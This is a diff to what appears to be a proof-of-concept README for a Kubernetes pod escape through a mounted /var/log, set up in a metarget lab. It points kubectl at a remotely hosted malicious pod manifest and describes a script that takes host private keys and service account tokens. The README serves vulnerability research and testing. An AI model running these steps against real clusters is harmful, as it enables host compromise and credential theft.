@@ -8,11 +8,8 @@ To perform the Proof of Concept, please follow the below steps:
 2. Prepare the vulnerable environment using the following command. <br/>
 `./metarget cnv install mount-var-log`
 
-3. Clone the repository which contains the configuration file, `escraper.yml`, for malicious Pod. <br/>
-`git clone https://github.com/danielsagi/kube-pod-escape.git`
-
-3. Prepare the malicious pod using the following command
-`kubectl create -f `
+3. Prepare the malicious pod using the following command. <br/>
+`kubectl create -f https://raw.githubusercontent.com/haseeb62/CVEs/main/Mount-var-log/POC/escaper.yml`
 4. Exec into the pod. The pod contains built-in exploit code which will read any files from the host.<br/>
 `kubectl exec -it mount-var-log -n metarget bash`
 5. Execute the `find_sensitive_files.py` script which downloads private key files and kubernetes service account tokens from the host.<br/>
